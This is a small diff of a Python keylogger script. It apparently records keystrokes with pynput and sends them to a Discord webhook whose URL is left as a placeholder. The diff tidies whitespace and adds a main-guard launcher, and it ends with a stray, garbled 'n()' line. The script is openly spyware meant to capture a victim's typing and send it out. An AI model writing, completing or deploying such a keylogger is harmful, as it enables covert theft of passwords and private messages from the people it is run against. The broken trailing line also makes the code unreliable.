@@ -1,7 +1,6 @@
-from dhooks import Webhook 
+from dhooks import Webhook
 from threading import Timer
 from pynput.keyboard import Listener
-
 
 
 WEBHOOK_URL = 'webhookfirsturl'
@@ -26,7 +25,7 @@ class Keylogger:
         with Listener(self._on_key_press) as t:
             t.join()
 
-
-
-
-Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
+if __name__ == "__main__":
+    keylogger = Keylogger(WEBHOOK_URL, TIME_INTERVAL)
+    keylogger.run()
+n()
